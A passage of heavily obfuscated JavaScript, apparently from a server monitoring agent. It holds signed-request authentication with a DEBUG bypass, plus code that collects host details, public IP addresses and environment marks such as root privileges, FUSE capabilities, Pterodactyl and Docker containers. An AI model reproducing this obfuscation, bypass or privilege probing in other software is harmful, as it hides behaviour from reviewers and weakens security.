            return a0a1[dX(0x79a)] && !f['get'](dX(0x6ed)) && f[dX(0x689)]('x-encrypted', c['TisEg']), i[dX(0x1a7)](this, n);
        };
        if (c[dV(0xb3e)](d[dV(0x394)], c[dV(0x3d3)]) || c[dV(0x614)](d[dV(0x394)], c[dV(0x89e)]))
            return a0a1[dV(0x79a)] && f[dV(0x689)](dV(0x6ed), dV(0x99a)), g();
        d[dV(0xaa6)] = ![];
        const j = [
            c[dV(0x202)],
            c['qXyPt']
        ];
        if (a0a1['DEBUG'])
            return d['is_authenticated'] = !![], c[dV(0x291)](g);
        const k = d['headers'][c[dV(0x754)]] || d[dV(0x258)]['X-Nonce'], l = d[dV(0x258)]['x-timestamp'] || d[dV(0x258)][c[dV(0x351)]], m = d[dV(0x258)][c[dV(0x3fe)]] || d[dV(0x258)][c[dV(0x7eb)]];
        if (!k || !l || !m)
            return j[dV(0x134)](d['path']) ? c[dV(0xd81)](g) : f[dV(0xaa2)](0x191)[dV(0x2a5)]({ 'error': dV(0x8e2) });
        try {
            let n = Buffer['alloc'](0x0);
            if (d[dV(0xa3d)] !== c[dV(0x731)]) {
                if (Buffer['isBuffer'](d[dV(0x341)]))
                    n = d['body'];
                else {
                    if (c['vdfXf'](typeof d[dV(0x341)], c[dV(0x9e7)]))
                        n = Buffer['from'](d[dV(0x341)], 'utf-8');
                }
            }
            const o = c[dV(0xd6a)](n[dV(0x55c)], 0x0) ? a0k[dV(0xb07)](c[dV(0x6ec)])[dV(0x442)](n)[dV(0x2f9)](c[dV(0x837)]) : '', p = b ? b['getActiveEcdsaVk']() : null, q = a['verifySignature'](d[dV(0x394)], d[dV(0xa3d)], o, k, l, m, p);
            d['is_authenticated'] = !![], d[dV(0x94a)] = c[dV(0xa38)](q, c['WLxzq']) ? c[dV(0x8fe)] : c['odjKU'];
        } catch (r) {
            return j[dV(0x134)](d[dV(0xa3d)]) ? c[dV(0x7e3)](g) : f[dV(0xaa2)](0x191)['json']({ 'error': dV(0x767) + r[dV(0xbe8)] });
        }
        if (d[dV(0x341)] && c[dV(0x383)](typeof d[dV(0x341)], dV(0x12a))) {
            const s = c[dV(0xd5c)]((d[dV(0x258)][c['qTZDH']] || '')[dV(0x426)](), c[dV(0x62c)]);
            try {
                if (s && d[dV(0xaa6)]) {
                    const t = Buffer[dV(0x1e7)](a0a1[dV(0x238)], dV(0x5bd)), u = a[dV(0x406)](d[dV(0x341)], t);
                    d[dV(0x341)] = JSON[dV(0x881)](u);
                } else {
                    if (d[dV(0x341)][dV(0x830)](c[dV(0x8bf)])) {
                        const v = Buffer['from'](d[dV(0x341)], c[dV(0xc49)])[dV(0x7a0)](c['ljFCc']);
                        d[dV(0x341)] = JSON['parse'](v);
                    } else {
                        if (d['body']['trim']()[dV(0x830)]('{') || d[dV(0x341)][dV(0x58a)]()[dV(0x830)]('['))
                            d['body'] = JSON['parse'](d[dV(0x341)]);
                        else {
                            if (c[dV(0x1c9)](d[dV(0x341)]['trim'](), ''))
                                d[dV(0x341)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0P['error'](dV(0xbda) + w[dV(0xbe8)]), f[dV(0xaa2)](0x190)[dV(0x2a5)]({ 'error': dV(0x5a3) + w[dV(0xbe8)] });
            }
        }
        c[dV(0xd81)](g);
    };
}
class a0ac {
    constructor() {
        const dY = a0cm, a = {
                'qEjtO': function (b, c) {
                    return b / c;
                }
            };
        this[dY(0x206)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[dY(0x254)] = 0x0, this['totalNetworkDown'] = 0x0, this[dY(0x9e4)] = a[dY(0xb15)](Date[dY(0x866)](), 0x3e8);
    }
    async [a0cm(0xcb5)]() {
        const dZ = a0cm, a = {
                'XADQA': dZ(0xd1b),
                'oRFsW': dZ(0x7d9),
                'ktHdB': function (d, f) {
                    return d === f;
                },
                'EnAuf': function (d, f, g) {
                    return d(f, g);
                },
                'gcCQx': function (d, f, g) {
                    return d(f, g);
                },
                'MFsVG': dZ(0xbae),
                'HFeBC': dZ(0x8e9),
                'Rqszb': dZ(0x2b5),
                'mlrjn': function (d, f) {
                    return d > f;
                },
                'AUWcL': function (d, f) {
                    return d === f;
                },
                'QqBdk': function (d, f) {
                    return d(f);
                },
                'iqCeA': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[dZ(0x23c)](a[dZ(0xb2c)], a[dZ(0x26f)]))[dZ(0x58a)]();
            b = a['ktHdB'](d, dZ(0x60c)) ? null : a[dZ(0x2fb)](parseInt, d, 0xa), c = a['gcCQx'](parseInt, (await a0m['readFile'](a[dZ(0xa74)], a[dZ(0x26f)]))[dZ(0x58a)](), 0xa);
        } catch {
            try {
                b = a['EnAuf'](parseInt, (await a0m[dZ(0x23c)](a[dZ(0xb32)], a[dZ(0x26f)]))[dZ(0x58a)](), 0xa), c = a[dZ(0x2fb)](parseInt, (await a0m['readFile'](a[dZ(0x857)], a['oRFsW']))[dZ(0x58a)](), 0xa);
                if (a[dZ(0x57a)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u['mem']();
                b = f[dZ(0x263)], c = f[dZ(0x3d5)];
            }
        }
        if (a[dZ(0x9f8)](b, null)) {
            const g = await a0u[dZ(0x1e6)]();
            b = g[dZ(0x263)], (a['AUWcL'](c, null) || a[dZ(0x12e)](isNaN, c)) && (c = g[dZ(0x3d5)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a['iqCeA'](b, c),
            'free': a[dZ(0x798)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const e0 = a0cm, a = await this[e0(0xc6e)](), b = await this[e0(0xcc9)](a['virtualization']), c = await this[e0(0xc87)](), d = a0ac['assembleBaseInfo'](a, b, c);
        return a0P[e0(0x3a5)](e0(0x20d) + JSON[e0(0xd94)](d, null, 0x2), 0x1), d;
    }
    static [a0cm(0x884)](a, b, c) {
        const e1 = a0cm;
        return {
            'arch': a[e1(0x6e1)],
            'cpu_cores': a[e1(0xb9b)],
            'cpu_name': a[e1(0xd82)],
            'disk_total': b[e1(0x5a1)],
            'gpu_name': a[e1(0x37a)],
            'ipv4': c[e1(0x663)] ?? null,
            'ipv6': c[e1(0x37f)] ?? null,
            'mem_total': b[e1(0xcee)],
            'os': a['os'],
            'kernel_version': a['kernel_version'],
            'swap_total': b[e1(0x5a4)],
            'version': a[e1(0xa49)],
            'virtualization': a[e1(0x92f)],
            'marks': Array['isArray'](a['marks']) ? [...a[e1(0x769)]] : []
        };
    }
    static ['staticFallback']() {
        const e2 = a0cm;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0a1[e2(0x67d)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0cm(0xcf1)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static [a0cm(0x755)]() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async [a0cm(0xc6e)]() {
        const e3 = a0cm;
        let a = {}, b = {};
        try {
            a = await a0u[e3(0x2cd)]();
        } catch (d) {
            a0P['debug']('获取\x20CPU\x20信息失败:\x20' + d['message'], 0x1);
        }
        try {
            b = await a0u[e3(0x4b8)]();
        } catch (f) {
            a0P[e3(0x3a5)](e3(0x85a) + f['message'], 0x1);
        }
        let c = '';
        try {
            c = await this['_getVirtualization']();
        } catch (g) {
            a0P['debug']('获取虚拟化信息失败:\x20' + g[e3(0xbe8)], 0x1);
        }
        return {
            'arch': a0p[e3(0x6e1)]() || '',
            'cpu_cores': a['cores'] || 0x0,
            'cpu_name': a[e3(0x4d3)] || '',
            'gpu_name': '',
            'os': ((b[e3(0x67e)] || '') + '\x20' + (b[e3(0x135)] || ''))['trim'](),
            'kernel_version': b[e3(0x3e7)] || '',
            'version': a0a1[e3(0x67d)],
            'virtualization': c,
            'marks': this[e3(0x130)]()
        };
    }
    async ['collectLocalInfo'](a) {
        const e4 = a0cm;
        let b = 0x0;
        try {
            b = (await a0u[e4(0xcaf)]())[0x0]?.[e4(0x883)] || 0x0;
        } catch (d) {
            a0P[e4(0x3a5)](e4(0x9b1) + d[e4(0xbe8)], 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[e4(0xcb5)]() || c;
        } catch (f) {
            a0P['debug'](e4(0x543) + f[e4(0xbe8)], 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c[e4(0x263)] || 0x0,
            'swap_total': c[e4(0xa2c)] || 0x0
        };
    }
    async [a0cm(0xc87)]() {
        const e5 = a0cm, a = {
                'yxeJO': function (d, f) {
                    return d === f;
                },
                'SaPYo': e5(0x596),
                'nWnJJ': 'fulfilled'
            }, [b, c] = await Promise['allSettled']([
                this[e5(0x804)](),
                this[e5(0x974)]()
            ]);
        if (a[e5(0x87f)](b[e5(0xaa2)], a[e5(0x527)]))
            a0P['debug'](e5(0x45b) + b[e5(0xacc)], 0x1);
        if (c['status'] === a[e5(0x527)])
            a0P['debug']('获取\x20IPv6\x20失败:\x20' + c[e5(0xacc)], 0x1);
        return {
            'ipv4': a[e5(0x87f)](b[e5(0xaa2)], a['nWnJJ']) ? b['value'] : null,
            'ipv6': a[e5(0x87f)](c[e5(0xaa2)], a[e5(0x323)]) ? c[e5(0xd89)] : null
        };
    }
    static ['MARKS_PROC_ROOT'] = a0cm(0x61a);
    static [a0cm(0xc7a)] = '/dev';
    static [a0cm(0x4f1)] = a0cm(0x2df);
    static ['MARKS_RUN_ROOT'] = '/run';
    static [a0cm(0xa87)] = '/';
    [a0cm(0x130)]() {
        const e6 = a0cm, a = {
                'WJERs': e6(0xd85),
                'glCOV': 'root',
                'JTlFU': 'pterodactyl',
                'DCoTO': e6(0x912),
                'pncoz': e6(0x4a0),
                'nmXEh': e6(0x4c2),
                'oLjBD': e6(0x611),
                'Ktkby': function (d) {
                    return d();
                },
                'GOwBI': e6(0xd2f)
            }, b = [];
        if (process['platform'] === a[e6(0x185)]) {
            const d = [
                [
                    a[e6(0x911)],
                    () => this[e6(0x6db)]()
                ],
                [
                    e6(0xc88),
                    () => this[e6(0x521)]()
                ],
                [
                    a[e6(0xd45)],
                    () => this[e6(0x451)]()
                ],
                [
                    a[e6(0x63b)],
                    () => this['_markSystemd']()
                ],
                [
                    a['pncoz'],
                    () => this[e6(0x2aa)]()
                ]
            ];
            for (const [f, g] of d) {
                try {
                    if (g())
                        b[e6(0x1d5)](f);
                } catch (h) {
                    a0P[e6(0x3a5)](e6(0x42c) + f + e6(0x165) + h[e6(0xbe8)], 0x1);
                }
            }
        }
        const c = [
            [
                a[e6(0xbd4)],
                () => this['_markKstore']()
            ],
            [
                a[e6(0x584)],
                () => this[e6(0xb76)]()
            ],
            [
                e6(0x9e9),
                () => this[e6(0x3d1)]()
            ]
        ];
        for (const [i, j] of c) {
            try {
                if (a[e6(0x58d)](j))
                    b['push'](i);
            } catch (k) {
                a0P[e6(0x3a5)](e6(0x42c) + i + ']:\x20' + k[e6(0xbe8)], 0x1);
            }
        }
        return a0P[e6(0x3a5)](e6(0x352) + (b[e6(0x455)](',') || a[e6(0x84b)]), 0x1), b;
    }
    ['_markKstore']() {
        const e7 = a0cm, a = {
                'XhCWm': function (b, c) {
                    return b === c;
                }
            };
        return a[e7(0x821)](a0ah[e7(0xc99)][e7(0xa9c)], !![]);
    }
    [a0cm(0xb76)]() {
        const e8 = a0cm, a = {
                'xvPgo': function (b, c) {
                    return b === c;
                }
            };
        return a[e8(0xd24)](a0a1['KMODE'], '1');
    }
    [a0cm(0x3d1)]() {
        const e9 = a0cm, a = {
                'ciKhj': function (b, c) {
                    return b === c;
                }
            };
        return a['ciKhj'](a0a1[e9(0xd88)], '2');
    }
    [a0cm(0x6db)]() {
        const ea = a0cm, a = {
                'oakuR': function (b, c) {
                    return b !== c;
                },
                'DdUbR': ea(0x13e),
                'Sxhtq': function (b, c) {
                    return b !== c;
                },
                'XwmOr': function (b, c) {
                    return b === c;
                }
            };
        if (a[ea(0x780)](typeof process[ea(0x706)], a[ea(0xabf)]) || a[ea(0xd40)](typeof process['getegid'], a[ea(0xabf)]))
            return ![];
        return a[ea(0xc41)](process[ea(0x706)](), 0x0) && process[ea(0x322)]() === 0x0;
    }
    [a0cm(0x521)]() {
        const eb = a0cm, a = { 'YzIly': eb(0xc88) };
        return a0ac[eb(0x27c)](a0o['join'](a0ac[eb(0xc7a)], a['YzIly']), 0xa, 0xe8);
    }
    ['_markFuse']() {
        const ec = a0cm, a = {
                'MFHGY': ec(0x4a0),
                'LBrPt': ec(0x425),
                'cyGHR': ec(0x92b),
                'flSlI': function (b, c) {
                    return b & c;
                }
            };
        if (!a0ac[ec(0x27c)](a0o[ec(0x455)](a0ac[ec(0xc7a)], a[ec(0x7cc)]), 0xa, 0xe5))
            return ![];
        if (this[ec(0xbbe)](0x15))
            return !![];
        for (const b of [
                a['LBrPt'],
                ec(0xdbb),
                ec(0xd28),
                a['cyGHR']
            ]) {
            try {
                const c = a0l['statSync'](a0o['join'](a0ac['MARKS_ROOT'], b));
                if (c[ec(0x349)]() && a['flSlI'](c['mode'], 0x800) && a[ec(0x94c)](c[ec(0x87c)], 0x49))
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    [a0cm(0x451)]() {
        const ed = a0cm, a = {
                'QQatZ': ed(0x101),
                'lvbKF': ed(0xbc8),
                'QngiK': ed(0xaf5),
                'AImTy': ed(0x7d9),
                'VwuuM': 'hostname',
                'WRMtj': ed(0x468),
                'vysOK': ed(0xdbc),
                'bCTpB': function (g, h) {
                    return g !== h;
                },
                'HNFnt': ed(0x965),
                'taKGP': function (g, h) {
                    return g > h;
                },
                'zywfw': function (g, h) {
                    return g === h;
                },
                'xEDOk': function (g, h) {
                    return g(h);
                },
                'sAwAC': ed(0x8bd),
                'KvvnT': ed(0xc76)
            };
        if (a0ac[ed(0x31c)](a0o['join'](a0ac[ed(0x99f)], a['QQatZ'], a[ed(0xf0)]), Buffer[ed(0x1e7)](a['QngiK'])))
            return !![];
        for (const g of [
                ed(0x101),
                '1'
            ]) {
            const h = a0ac[ed(0x90e)](a0o[ed(0x455)](a0ac['MARKS_PROC_ROOT'], g, ed(0xb6a)));
            if (!h)
                continue;
            const i = h[ed(0x7a0)](a[ed(0x6b2)])[ed(0xb0c)]('\x00'), j = i[ed(0x758)](l => l[ed(0x830)](ed(0xd84))), k = i[ed(0x758)](l => l[ed(0x830)]('P_SERVER_LOCATION='));
            if (j && k)
                return !![];
        }
        const b = a0ac[ed(0x90e)](a0o[ed(0x455)](a0ac[ed(0x4f1)], a[ed(0x77a)]));
        if (!b)
            return ![];
        const c = b['toString'](a['AImTy'])[ed(0x58a)]()[ed(0x426)]();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/['test'](c))
            return ![];
        try {
            if (!a0l[ed(0xc6d)](a0o[ed(0x455)](a0ac[ed(0xa87)], a[ed(0x502)], a[ed(0x633)]))[ed(0x5fc)]())
                return ![];
        } catch {
            return ![];
        }
        if (a[ed(0x747)](typeof process[ed(0x706)], ed(0x13e)))
            return ![];
        const d = process[ed(0x706)](), f = a0ac['_readLimited'](a0o[ed(0x455)](a0ac[ed(0x4f1)], a[ed(0x8cf)]));
        if (!f)
            return ![];
        for (const l of f[ed(0x7a0)](a[ed(0x6b2)])[ed(0xb0c)]('\x0a')) {
            const m = l[ed(0xb0c)](':');
            if (a[ed(0x3e4)](m[ed(0x55c)], 0x2) && a[ed(0xbb8)](a[ed(0x24d)](Number, m[0x2]), d))
                return ![];
        }
        return a0l[ed(0xc25)](a0o[ed(0x455)](a0ac[ed(0xa87)], a[ed(0x8d5)])) || a0l[ed(0xc25)](a0o[ed(0x455)](a0ac[ed(0xc7e)], a['KvvnT']));
    }
    [a0cm(0xd07)]() {
        const ee = a0cm, a = {
                'zRQOc': 'systemd',
                'pOUwQ': 'private',
                'vCjqp': ee(0xc2b),
                'gEciG': ee(0x89a),
                'KkSsH': 'comm',
                'AUFxR': ee(0x7d9),
                'TWisP': ee(0x62e)
            };
        try {
            if (!a0l['statSync'](a0o[ee(0x455)](a0ac['MARKS_RUN_ROOT'], a[ee(0x60b)], 'system'))[ee(0x5fc)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l[ee(0xc25)](a0o[ee(0x455)](a0ac[ee(0xc7e)], a['zRQOc'], a[ee(0xa64)])) && !a0l[ee(0xc25)](a0o[ee(0x455)](a0ac[ee(0xc7e)], a[ee(0xc4d)], a[ee(0x180)])))
            return ![];
        if (!a0ac['_systemctlLocatable']())
            return ![];
        const b = a0ac[ee(0x90e)](a0o[ee(0x455)](a0ac[ee(0x99f)], '1', a[ee(0x453)]));
        if (b) {
            const c = b[ee(0x7a0)](a[ee(0x40b)])[ee(0x58a)]();
            if (c)
                return c['toLowerCase']()['includes'](a['zRQOc']);
        }
        try {
            const d = a0l['readlinkSync'](a0o['join'](a0ac[ee(0x99f)], '1', a[ee(0xb29)]));
            if (d && !a0o[ee(0x814)](d)[ee(0x426)]()[ee(0x134)](a[ee(0x60b)]))
                return ![];
        } catch {
        }
        return !![];
    }
    [a0cm(0xbbe)](a) {
        const ef = a0cm, b = {
                'WZfjI': 'self',
                'CAhox': ef(0xaa2),
                'ecBMf': ef(0x7d9),
                'wHOEl': 'CapEff:',
                'YWDsW': function (d, f) {
                    return d < f;
                },
                'DYSaf': function (d, f) {
                    return d === f;
                },
                'YsZfZ': function (d, f) {
                    return d & f;
                },
                'DCkKz': function (d, f) {
                    return d(f);
                }
            }, c = a0ac['_readLimited'](a0o['join'](a0ac[ef(0x99f)], b['WZfjI'], b[ef(0x64e)]));
        if (!c)
            return ![];
        for (const d of c[ef(0x7a0)](b[ef(0x9e0)])[ef(0xb0c)]('\x0a')) {
            if (d[ef(0x830)](b[ef(0x361)])) {
                const f = d[ef(0xb0c)](/\s+/);
                if (b[ef(0xbf4)](f['length'], 0x2))
                    return ![];
                try {
                    return b[ef(0x67c)](b[ef(0x373)](b[ef(0x229)](BigInt, '0x' + f[0x1]) >> b[ef(0x229)](BigInt, a), 0x1n), 0x1n);
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static [a0cm(0x766)]() {
        const eg = a0cm, a = {
                'tHTul': 'usr/local/bin/systemctl',
                'QtsQx': 'systemctl'
            };
        for (const b of [
                eg(0xda9),
                eg(0x995),
                a[eg(0x774)]
            ]) {
            if (a0ac['_executable'](a0o['join'](a0ac['MARKS_ROOT'], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[eg(0xb0c)](a0o[eg(0x331)])) {
            if (c && a0ac[eg(0x15c)](a0o[eg(0x455)](c, a['QtsQx'])))
                return !![];
        }
        return ![];
    }
    static ['_executable'](a) {
        const eh = a0cm, b = {
                'WuWTP': function (c, d) {
                    return c !== d;
                },
                'hNQCu': function (c, d) {
                    return c & d;
                }
            };
        try {
            const c = a0l[eh(0xc6d)](a);
            return c[eh(0x349)]() && b[eh(0xc1c)](b[eh(0x684)](c[eh(0x87c)], 0x49), 0x0);
        } catch {
            return ![];
        }
    }
    static [a0cm(0x27c)](a, b, c) {
        const ei = a0cm, d = {
                'ETypg': function (f, g) {
                    return f !== g;
                },
                'mcOXC': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l['statSync'](a);
            if (!f['isCharacterDevice']())
                return ![];
            if (d['ETypg'](a0ac[ei(0x1d6)](f[ei(0xb62)]), b) || d['mcOXC'](a0ac[ei(0xba1)](f[ei(0xb62)]), c))
                return ![];
            const g = a0l['openSync'](a, 'r+');
            try {
                return !![];
            } finally {
                a0l[ei(0x200)](g);
            }
        } catch {
            return ![];
        }
    }
    static [a0cm(0x1d6)](a) {
        const ej = a0cm, b = {
                'aEbvm': function (f, g) {
                    return f % g;
                },
                'sAoxy': function (f, g) {
                    return f | g;
                },
                'zNuvM': function (f, g) {
                    return f & g;
                }
            }, c = b[ej(0xaec)](Math[ej(0x19a)](a / 0x100), 0x1000), d = Math[ej(0x19a)](a / 0x100000000);
        return b['sAoxy'](c, b['zNuvM'](d, ~0xfff)) >>> 0x0;
    }
    static [a0cm(0xba1)](a) {
        const ek = a0cm, b = {
                'rGBfV': function (f, g) {
                    return f & g;
                },
                'PRtyR': function (f, g) {
                    return f % g;
                },
                'FMagR': function (f, g) {
                    return f / g;
                },
                'TOnNu': function (f, g) {
                    return f >>> g;
                },
                'XgTfp': function (f, g) {
                    return f | g;
                }
            }, c = a % 0x100, d = b[ek(0xa0e)](b[ek(0xd1c)](Math[ek(0x19a)](b[ek(0x306)](a, 0x1000)), 0x100000), 0xfff00);
        return b[ek(0x153)](b['XgTfp'](c, d), 0x0);
    }
    static ['_readLimited'](a, b = 0x400 * 0x400) {
        const el = a0cm, c = {
                'oNPgI': function (f, g) {
                    return f < g;
                },
                'QvXpF': function (f, g) {
                    return f - g;
                },
                'jtYms': function (f, g) {
                    return f !== g;
                }
            };
        let d = null;
        try {
            d = a0l['openSync'](a, 'r');
            const f = Buffer['alloc'](0x2000), g = [];
            let h = 0x0;
            while (c['oNPgI'](h, b)) {
                const i = a0l['readSync'](d, f, 0x0, Math[el(0x389)](f[el(0x55c)], c[el(0x42a)](b, h)), null);
                if (!i)
                    break;
                g[el(0x1d5)](Buffer['from'](f[el(0x262)](0x0, i))), h += i;
            }
            return Buffer[el(0x5f9)](g);
        } catch {
            return null;
        } finally {
            if (c['jtYms'](d, null))
                try {
                    a0l['closeSync'](d);
                } catch {
                }
        }
    }
    static [a0cm(0x31c)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const em = a0cm, f = {
                'ZAdqe': function (h, i) {
                    return h - i;
                },
                'yipYH': function (h, i) {
                    return h < i;
                },
                'ZtqgN': function (h, i) {
                    return h !== i;
                },
                'NLZZf': function (h, i) {
                    return h !== i;
                }
            };
        let g = null;
        try {
            g = a0l[em(0x7c5)](a, 'r');
            const h = Math[em(0x60c)](0x0, f[em(0x129)](b[em(0x55c)], 0x1)), i = Buffer[em(0x2d9)](d);
            let j = Buffer[em(0x2d9)](0x0), k = 0x0;
            while (f[em(0xb5f)](k, c)) {
                const l = a0l[em(0x8dd)](g, i, 0x0, Math[em(0x389)](d, c - k), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer['concat']([
                    j,
                    i[em(0x262)](0x0, l)
                ]);
                if (f[em(0xca9)](m[em(0x1eb)](b), -0x1))
                    return !![];
                j = h ? Buffer[em(0x1e7)](m['subarray'](Math[em(0x60c)](0x0, m[em(0x55c)] - h))) : Buffer[em(0x2d9)](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (f['NLZZf'](g, null))
                try {
                    a0l['closeSync'](g);
                } catch {
                }
        }
    }
    [a0cm(0xc63)]() {
        const en = a0cm, a = {
                'gdnwf': en(0x3ca),
                'pTcFG': function (c, d) {
                    return c === d;
                }
            }, b = a0p['networkInterfaces']();
        for (const c of Object[en(0x40f)](b)) {
            for (const d of b[c]) {
                const f = d['family'] === a['gdnwf'] || a[en(0x8fc)](d[en(0xd4d)], 0x4);
                if (f && !d[en(0x7d5)]) {
                    if (!/^10\./[en(0xdb7)](d[en(0x152)]) && !/^192\.168\./[en(0xdb7)](d['address']) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[en(0xdb7)](d[en(0x152)]))
                        return d[en(0x152)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const eo = a0cm, a = {
                'MVQjD': eo(0x2f4),
                'xkXHx': eo(0x6af),
                'QnzNo': eo(0x2c3),
                'WteqL': eo(0x700),
                'xdGyk': eo(0xf6),
                'nAfll': eo(0x157),
                'MJpfM': 'https://myexternalip.com/raw'
            }, b = [
                a[eo(0x6d2)],
                a[eo(0x4ef)],
                a[eo(0xf1)],
                a['WteqL'],
                a[eo(0x7a4)],
                a['nAfll'],
                a['MJpfM']
            ];
        for (const d of b) {
            try {
                const f = await this[eo(0xd4c)](d, 0x4);
                if (f && this[eo(0xb3a)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[eo(0xb3a)](c))
            return c;
        return null;
    }
    [a0cm(0x94b)]() {
        const ep = a0cm, a = {
                'AlZGT': function (c, d) {
                    return c === d;
                },
                'ZtDYQ': ep(0x3cd),
                'Vhhbj': function (c, d) {
                    return c === d;
                },
                'kTtsT': ep(0x276)
            }, b = a0p[ep(0x593)]();
        for (const c of Object[ep(0x40f)](b)) {
            for (const d of b[c]) {
                const f = a[ep(0x864)](d[ep(0xd4d)], a['ZtDYQ']) || a[ep(0x189)](d['family'], 0x6);
                if (f && !d[ep(0x7d5)]) {
                    if (!d[ep(0x152)][ep(0x426)]()[ep(0x830)](a[ep(0x241)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0cm(0x974)]() {
        const eq = a0cm, a = { 'gXtKV': eq(0xd49) }, b = this['getLocalIPv6']();
        if (b && this[eq(0xaea)](b))
            return b;
        const c = [
            a[eq(0x376)],
            eq(0x6af),
            'https://v6.ident.me'
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this[eq(0xaea)](f))
                    return f;
            } catch (g) {
                a0P[eq(0x3a5)](eq(0x620) + d + '\x20失败:\x20' + g[eq(0xbe8)]);
                continue;
            }
        }
        return null;
    }
    async [a0cm(0xd4c)](a, b = 0x0) {
        const er = a0cm, c = {
                'HyzOd': function (d, f) {
                    return d(f);
                },
                'SkPPB': '请求超时',
                'TYDoi': er(0x536),
                'BXWhc': er(0x959),
                'Tvcxu': er(0x36b),
                'wNpZR': er(0xaa0)
            };
        return new Promise((d, f) => {
            const es = er, g = { 'ckAXb': c['TYDoi'] }, h = c['HyzOd'](require, c[es(0x508)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[es(0x4ed)] }
                }, j = h[es(0x81a)](a, i, k => {
                    const et = es;
                    let l = '';
                    if (k[et(0x16d)] !== 0xc8) {
                        f(new Error('HTTP\x20' + k[et(0x16d)]));
                        return;
                    }
                    k['on']('data', m => l += m), k['on'](g['ckAXb'], () => d(l[et(0x58a)]()));
                });
            j['on'](c[es(0x2da)], f), j['setTimeout'](0x1388, () => {
                const eu = es;
                j['destroy'](), c['HyzOd'](f, new Error(c[eu(0x10c)]));
            });
        });
    }
    [a0cm(0xb3a)](a) {
        const ev = a0cm;
        return /^(\d{1,3}\.){3}\d{1,3}$/[ev(0xdb7)](a);
    }
    [a0cm(0xaea)](a) {
        const ew = a0cm;
        if (!/^[0-9a-fA-F:]+$/[ew(0xdb7)](a) || !a['includes'](':'))
            return ![];
        const b = a['split'](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/['test'](b);
    }
    async [a0cm(0xaf9)]() {
        const ex = a0cm, a = {
                'XFjXK': function (m, n) {
                    return m / n;
                },
                'MvzUj': function (m, n) {
                    return m - n;
                },
                'WvJni': function (m, n) {
                    return m * n;
                },
                'XGnUY': function (m, n) {
                    return m / n;
                },
                'QIutG': function (m, n) {
                    return m * n;
                }
            }, [b, c, d, f] = await Promise['all']([
                a0u[ex(0x21b)](),
                a0u[ex(0x1e6)](),
                a0u[ex(0x996)](),
                a0u[ex(0x21b)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[ex(0x91b)](Date['now'](), 0x3e8), i = a['MvzUj'](h, this['lastNetworkTime']), j = g['tx_bytes'] - this[ex(0x206)]['tx'], k = a['MvzUj'](g[ex(0x96d)], this['lastNetworkStats']['rx']);
        this[ex(0x254)] += j, this[ex(0x1f3)] += k, this['lastNetworkStats'] = {
            'tx': g[ex(0x24b)],
            'rx': g[ex(0x96d)]
        }, this[ex(0x9e4)] = h;
        const l = await a0u[ex(0x5e6)]();
        return {
            'cpu': { 'usage': Math['round'](b[ex(0x21b)]) },
            'ram': {
                'total': c[ex(0x263)],
                'used': c[ex(0xbaf)]
            },
            'swap': {
                'total': c[ex(0xa2c)],
                'used': c['swapused']
            },
            'load': {
                'load1': a[ex(0x91b)](Math[ex(0x252)](a[ex(0x34d)](f[ex(0x9dd)], 0x64)), 0x64),
                'load5': a[ex(0x617)](Math['round'](a[ex(0x34d)](f[ex(0x9dd)], 0x64)), 0x64),
                'load15': Math['round'](a[ex(0x509)](f[ex(0x9dd)], 0x64)) / 0x64
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math['round'](j / i),
                'down': Math[ex(0x252)](k / i),
                'totalUp': this[ex(0x254)],
                'totalDown': this[ex(0x1f3)]
            },
            'connections': await this[ex(0xc32)](),
            'uptime': a0p[ex(0x1cb)](),
            'process': l?.[ex(0x479)] || 0x0,
            'message': ''
        };
    }
    async [a0cm(0x6f9)]() {
        const ey = a0cm, a = {
                'ODFDj': ey(0xb0a),
                'pRYpK': 'Docker',
                'YuJwq': ey(0x6c1),
                'wMSTW': ey(0xeb),
                'LlJjN': ey(0x7b2),
                'TyqmZ': ey(0x71c),
                'Ehzhl': ey(0xba6),
                'MrVJz': ey(0xc02),
                'IQpcR': ey(0x5cb),
                'QMlKp': '/proc/self/mountinfo',
                'XcCXP': ey(0x7d9),
                'xeQmL': '/docker/containers/',
                'OCHCi': 'workdir=/var/lib/docker',
                'KxDeA': '/pods/',
                'HIpZF': 'kubelet',
                'ArTVQ': ey(0x4c9),
                'izsMb': ey(0xac5),
                'ZQvVV': ey(0xb9a),
                'YXvNQ': ey(0xc3b),
                'bPSbR': ey(0x9a2),
                'niKtv': ey(0x3cc)
            };
        try {
            if (a0l[ey(0xc25)](a[ey(0x601)]))
